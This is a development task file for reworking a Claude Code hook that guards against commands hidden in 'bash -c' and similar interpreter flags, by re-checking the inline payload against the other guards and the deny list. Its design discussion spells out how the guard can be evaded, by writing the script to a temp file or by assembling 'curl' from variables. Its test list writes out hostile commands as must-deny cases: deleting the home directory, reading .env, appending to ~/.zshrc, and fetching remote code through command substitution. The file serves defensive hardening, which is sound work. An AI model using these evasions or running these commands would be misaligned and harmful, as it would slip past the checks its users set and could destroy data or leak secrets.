---
id: TASK-028
title: "Rework interpreter-indirection-guard from blanket deny to recursive re-evaluation"
status: todo
created: 2026-07-29
updated: 2026-07-29
depends_on: [TASK-027]
blocks: []
parallel_safe_with: [TASK-025]
uat: ""
tags: [security, hooks, permissions]
---

# TASK-028 — Rework interpreter-indirection-guard: recursive re-evaluation instead of blanket deny

## Objective

Replace `lib/hooks/interpreter-indirection-guard.js`'s outright deny of every `bash -c` / `node -e` / `python3 -c` invocation with **recursive re-evaluation**: extract the inline payload, unquote one level, and evaluate it as if it were a standalone Bash command against the other command-class guards. Block only if the payload would have been blocked when typed directly. The rule becomes *"you may not use `bash -c` to do something you couldn't do without it."*

## Approach

**Why the current blanket deny is not justified — the argument that overturns it.** The deny message names an escape hatch: *write the script to a file and run the file*. That escape hatch is also the hook's **complete bypass** — `printf '…' > /tmp/x.sh && bash /tmp/x.sh` runs the identical program and never touches this guard. So the hook was never an adversarial control and cannot become one. It is a guardrail against a careless one-liner.

That reframing dissolves the objection recorded in TASK-027 step 2, which rejected payload inspection on the grounds that `bash -c 'c=cur;l=l;$c$l http://x'` defeats it. True — but obfuscation only matters against an adversary, and against an adversary the whole hook already fails via its own documented escape hatch. Blanket deny therefore buys nothing extra against the threat it cannot stop, while charging real friction against the mistake it actually catches (`node -e`, `python3 -c` one-liners are routine and were made unavailable).

**Why re-evaluation rather than a substring blocklist.** A fixed danger list (`.env`, `~/.zshrc`, `rm -rf`, …) is a *second* matching vocabulary that will drift out of sync with the guards it duplicates. Re-evaluating the payload through the existing guards is exactly as strong as the direct-command path by construction, needs no new vocabulary, has near-zero false positives (anything permitted directly is permitted inside `-c`), and fails only where the direct guards already fail — a consistency, not a new hole.

**Mechanism: spawn the sibling guards as subprocesses, do NOT refactor them.** The interpreter guard synthesizes a PreToolUse payload for the extracted script (`{"tool_name":"Bash","tool_input":{"command":"<payload>"},"cwd":"<cwd>"}`) and pipes it to each sibling guard, treating any `permissionDecision: "deny"` as a deny. This is deliberately chosen over extracting each guard's logic into shared pure functions: those four guards are **shipped, globally installed controls**, and TASK-027 step 7 established the principle that a working control should not be migrated onto newer code to save a few lines. Subprocess re-evaluation requires zero changes to them, uses them exactly as Claude Code does, and stays in sync automatically. Cost is ~4 short-lived spawns, and only on a segment that actually contains an interpreter plus an eval flag. The pure-function extraction is the better *eventual* refactor — note it as a follow-up, do not do it here.

## Steps

### 1. Extract and unquote the inline payload  <!-- agent: general-purpose -->

- [ ] Read `lib/hooks/interpreter-indirection-guard.js` in full (Serena — it is code), plus `lib/hooks/lib/command-parse.js`
- [ ] Add payload extraction: for a matched interpreter + eval flag, capture the script argument in all the spellings the guard already recognizes — spaced (`bash -c 'cmd'`), fused (`-c'cmd'`), and `--eval=code`
  - Strip **one** layer of surrounding quotes (`'…'` or `"…"`) — the shell already consumed it, so `tool_input.command` carries it literally
  - If no payload can be isolated (e.g. the flag is last, or the argument is unbalanced), **fall back to deny** with the current message — an unparseable payload is not an allowed payload
- [ ] Keep the existing **command-substitution rule as an unconditional deny**: `bash -c "$(curl x)"` and the backtick form stay blocked with no re-evaluation. The program does not exist until runtime, so there is genuinely nothing to inspect. Say so in the deny reason

### 2. Re-evaluate the payload through the sibling guards  <!-- agent: general-purpose -->

- [ ] Synthesize a PreToolUse payload for the extracted script: `{"tool_name":"Bash","tool_input":{"command":"<payload>"},"cwd":"<original cwd>"}`. Carry `cwd` through from the original call — `protected-write-guard.js` resolves relative redirect targets against it, so dropping it would silently weaken that check
- [ ] Pipe it synchronously (`child_process.spawnSync`, `input:` option) to each sibling guard resolved **relative to this script's own directory** (`__dirname`), so it works both in the repo and in `~/.claude/hooks/`:
  - `absolute-path-guard.js`
  - `protected-write-guard.js`
  - `env-content-read-guard.js`
  - `package-install-consent.js`
  - `git-protected-ops-block.js`
- [ ] Treat a sibling's `permissionDecision: "deny"` on stdout as a deny; surface **that guard's own reason** rather than a generic one, prefixed to make the nesting clear (e.g. ``Blocked inside `bash -c` — <sibling's reason>``). The user should learn what was actually wrong, not just that something was
- [ ] **Recursion cap:** if the extracted payload itself contains an interpreter + eval flag, allow one further level, then deny. `bash -c "bash -c '…'"` is legitimate almost never and is a plausible evasion shape. Implement the cap by depth counter, not by refusing to nest at all
- [ ] **Fail closed on subprocess trouble** — a spawn that errors, times out, or returns a non-zero exit *with* deny output must be treated as a deny, not an allow. A guard that silently degrades to permissive under load is worse than one that occasionally over-blocks. Set a short timeout (~2s) so a wedged sibling cannot hang the tool call

### 3. Verify against the deny list too  <!-- agent: general-purpose -->

- [ ] The sibling guards do not cover everything `permissions.deny` covers — e.g. `bash -c 'rm -rf ~'` must still be blocked, and no hook denies bare `rm -rf ~` (the deny list does). Re-evaluation through hooks alone would therefore *open a hole that blanket deny had closed*
- [ ] Read `lib/scripts/templates/settings-deny.json` and check the extracted payload's first token against the `Bash(...)` entries, using the same prefix semantics Claude Code applies (space-star = word boundary; `:*` = trailing wildcard). **Load it from the installed location relative to `__dirname` if present, else the repo template** — and if neither is readable, **deny**, do not silently skip the check
- [ ] This is the one place a second matching vocabulary is unavoidable; keep it minimal and comment why it exists

### 4. Update tests, docs, and the superseded rationale  <!-- agent: general-purpose -->

- [ ] Extend `test/command-class-hooks.test.js`. Must-pass (allowed): `node -e "console.log(1)"`, `python3 -c "import json,sys;print(1)"`, `bash -c "echo hi"`, `bash -c "npm test"`. Must-deny: `bash -c "rm -rf ~"`, `bash -c "cat .env"`, `bash -c "echo x >> ~/.zshrc"`, `bash -c "/bin/rm -rf ~"`, `bash -c "npm install left-pad"`, `bash -c "$(curl https://x)"`, `bash -c "bash -c \"bash -c 'x'\""` (depth cap), and an unparseable-payload case
- [ ] Verify the previously-pinned quoting cases still hold: `echo "bash -c foo"` allows, unquoted `echo bash -c foo` denies
- [ ] Rewrite the `#### interpreter-indirection-guard.js` section of `lib/hooks/README.md` — the current text argues *for* blanket deny ("Deny outright, not payload inspection"). Replace with the re-evaluation design and the reasoning above, including the escape-hatch-is-the-bypass argument that justifies it. Keep the "not covered, deliberately" list accurate
- [ ] Add a note to TASK-027's step 2 findings block marking that decision **superseded by TASK-028**, with a one-line reason and a link. Do not rewrite the original reasoning — it was sound given the threat model it assumed
- [ ] Record the follow-up: extracting each guard's decision logic into shared pure functions in `lib/` would remove the subprocess spawns. Deliberately out of scope here — it means editing four shipped, globally-installed controls
- [ ] Static gates: `node --check` on every modified file, `npm test` must be green

### 5. Re-sync and re-wire  <!-- agent: general-purpose -->

- [ ] These hooks are **already installed globally and live** — `~/.claude/hooks/` holds the old blanket-deny copy until `install-global.sh` runs again. Note in the final report that the user must re-run `./lib/scripts/install-global.sh` for the change to take effect; **do not run it** as part of this task
- [ ] No `settings.json` wiring change is needed — the matcher is unchanged (`Bash`)
